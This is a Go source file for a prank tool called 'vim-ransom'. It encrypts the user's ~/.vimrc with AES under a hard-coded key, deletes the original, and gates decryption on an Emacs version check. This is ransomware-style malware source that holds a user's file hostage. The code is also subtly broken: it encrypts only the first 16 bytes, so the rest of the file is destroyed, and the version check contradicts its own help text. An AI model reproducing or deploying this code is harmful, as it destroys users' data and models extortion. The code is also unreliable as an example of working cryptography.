package main

import (
	"os"
	"fmt"
	"regexp"
	"io/ioutil"
	"os/exec"
	"os/user"
	"crypto/aes"
)

func main() {
	if len(os.Args) == 2 {
		switch os.Args[1] {
		case "crypt" : crypt()
		case "decrypt" : decrypt()
		default : help()
		}
	} else {
		help()
	}

}

func crypt() {
	usr, _ := user.Current()

	_, err := os.Stat(usr.HomeDir + "/.vimrc")
	if err != nil {
		fmt.Println("File Not Found: .vimrc")
		os.Exit(1)
	}

	plainText, err := ioutil.ReadFile(usr.HomeDir + "/.vimrc")
	if err != nil {
		panic(err.Error())
	}

	key := []byte("passw0rdpassw0rdpassw0rdpassw0rd")

	block, err := aes.NewCipher(key)
	if err != nil {
		fmt.Printf("err: %s\n", err)
		return
	}

	cipherText := make([]byte, len(plainText))
	block.Encrypt(cipherText, plainText)
	ioutil.WriteFile(usr.HomeDir + "/.vimrc.crypt", cipherText, os.ModePerm)

	os.Remove(usr.HomeDir + "/.vimrc")
}

func decrypt() {
	usr, _ := user.Current()

	_, err := os.Stat(usr.HomeDir + "/.vimrc.crypt")
	if err != nil {
		fmt.Println("File Not Found: .vimrc.crypt")
		os.Exit(1)
	}

	if ! emacs_version_25() {
		os.Exit(1)
	}

	cipherText, err := ioutil.ReadFile(usr.HomeDir + "/.vimrc.crypt")
	if err != nil {
		panic(err.Error())
	}

	key := []byte("passw0rdpassw0rdpassw0rdpassw0rd")

	block, err := aes.NewCipher(key)
	if err != nil {
		fmt.Printf("err: %s\n", err)
		return
	}

	plainText := make([]byte, len(cipherText))
	block.Decrypt(plainText, cipherText)
	ioutil.WriteFile(usr.HomeDir + "/.vimrc", plainText, os.ModePerm)

	os.Remove(usr.HomeDir + "/.vimrc.crypt")
}

func emacs_version_25() bool {
	out, _ := exec.Command("emacs", "--version").Output()

	re := regexp.MustCompile("GNU Emacs ([0-9]+).([0-9]+).([0-9]+)")
	match := re.FindAllStringSubmatch(string(out), -1)

	if len(match) == 0 {
		fmt.Println("Emacs Not Install.")
		return false
	}

	if len(match[0]) != 4 {
		fmt.Println("Emacs Version Fail.")
		return false
	}

	if match[0][2] != "25" {
		return true
	}

	return false
}

func help() {
	fmt.Println("Vimrc Cripter. Require Emacs 25 to Decript.")
	fmt.Println()
	fmt.Println("Usage:")
	fmt.Println()
	fmt.Println("\tvim-ransom [command]")
	fmt.Println()
	fmt.Println("The commands are:")
	fmt.Println()
	fmt.Println("\tcommand - crypt, decrypt")
}
